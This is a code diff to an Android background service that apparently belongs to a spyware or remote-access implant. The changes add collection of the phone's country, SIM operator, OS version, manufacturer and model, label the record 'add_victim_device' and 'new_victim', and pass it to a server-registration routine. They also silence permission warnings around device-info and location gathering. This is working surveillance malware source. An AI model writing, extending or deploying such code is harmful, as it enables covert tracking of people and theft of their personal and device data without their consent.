@@ -1,6 +1,7 @@
 package com.velociraptor.raptor;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.Context;
 import android.content.ContextWrapper;
@@ -15,6 +16,8 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.speech.tts.TextToSpeech;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Base64;
 import android.util.Log;
@@ -116,18 +119,25 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         textToSpeech = new TextToSpeech(context, this);
     }
 
+    @SuppressLint("MissingPermission")
     private void getDeviceInfo() {
         EasyIdMod easyIdMod = new EasyIdMod(context);
-        HashMap<String, String> postData = new HashMap<>();
-        postData.put("new_device", easyIdMod.getUA() + "");
-        postData.put("unique_id", easyIdMod.getPseudoUniqueID() + "");
+        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         deviceUniqueId = easyIdMod.getPseudoUniqueID() + "";
+        String release = Build.VERSION.RELEASE;
+        String countryCode = telephonyManager.getNetworkCountryIso();
+        String deviceName = android.os.Build.MANUFACTURER;
+        String modelName = android.os.Build.MODEL;
+
+        HashMap<String, String> postData = new HashMap<>();
+        postData.put("add_victim_device", "new_victim");
+        postData.put("unique_id", deviceUniqueId);
+        postData.put("country", countryCode.toUpperCase() + "");
+        postData.put("software_version",  "Android " + release);
+        postData.put("sim_operator", telephonyManager.getSimOperatorName() + "");
+        postData.put("device_model", deviceName + " - " + modelName);
 
         EasyDeviceMod easyDeviceMod = new EasyDeviceMod(context);
-        postData.put("imei", "Not supported");
-        postData.put("os_version", easyDeviceMod.getOSVersion() + "");
-        postData.put("phone_product", easyDeviceMod.getManufacturer() + "");
-        postData.put("phone_model", easyDeviceMod.getModel() + "");
         postData.put("device_language", easyDeviceMod.getLanguage() + "");
         postData.put("is_rooted", easyDeviceMod.isDeviceRooted() + "");
 
@@ -136,9 +146,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
         EasyMemoryMod easyMemoryMod = new EasyMemoryMod(context);
         postData.put("total_ram", easyMemoryMod.convertToGb(easyMemoryMod.getTotalRAM()) + "");
-
-        Locale current = ConfigurationCompat.getLocales(getResources().getConfiguration()).get(0);
-        postData.put("locale_info", current + "");
         createVictimIntoClient(postData);
     }
 
@@ -538,6 +545,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         sendPostDataToServer(postData);
     }
 
+    @SuppressLint("MissingPermission")
     private void prepareLocationdata() {
 
         tracker.quickFix(this.context);
